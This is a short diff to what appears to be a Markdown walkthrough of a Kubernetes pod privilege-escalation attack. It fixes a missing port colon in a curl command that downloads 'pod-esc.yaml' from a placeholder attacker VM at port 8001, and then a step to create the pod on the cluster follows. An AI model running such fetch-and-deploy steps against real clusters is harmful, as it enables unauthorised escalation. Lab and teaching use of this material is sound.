@@ -394,7 +394,7 @@ yes
 
 **Download the `pod-esc.yaml` from the attacker VM**
 ```bash
-curl -vk http://<attacker_vm_public_ip>8001/pod-esc.yaml -o /tmp/pod-esc.yaml
+curl -vk http://<attacker_vm_public_ip>:8001/pod-esc.yaml -o /tmp/pod-esc.yaml
 ```
 
 **Create the pod on the cluster**
